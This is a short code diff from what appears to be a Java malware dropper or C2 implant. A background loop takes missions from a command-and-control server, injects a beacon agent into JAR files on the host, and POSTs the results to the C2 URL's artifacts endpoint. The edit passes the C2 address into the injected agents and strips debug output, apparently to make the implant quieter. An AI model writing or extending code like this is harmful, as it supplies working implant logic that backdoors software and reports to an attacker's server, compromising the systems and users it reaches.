@@ -32,20 +32,20 @@ public class DropperBackgroundService {
                         artifactContent = gson.toJson(injector.getInjectableJars());
                     }
                     if (currentMission.getType() == MissionType.INJECT_BEACON) {
-                        artifactContent = gson.toJson(injector.injectAgentToJar(currentMission.getArgs()[0], currentMission.getArgs()[1]));
+                        artifactContent = gson.toJson(injector.injectAgentToJar(currentMission.getArgs()[0],
+                                currentMission.getArgs()[1],
+                                c2Url));
                     }
 
                     Artifact artifact = new Artifact(artifactContent, currentMission.getId(), agent.getId());
                     sendPOST(c2Url + "/artifacts", gson.toJson(artifact));
                 }
             } catch (IOException e) {
-                System.out.println("IO 42");
             }
 
             try {
                 Thread.sleep(5000);
             } catch (InterruptedException e) {
-                System.out.println("Int 48");
             }
         }
     }
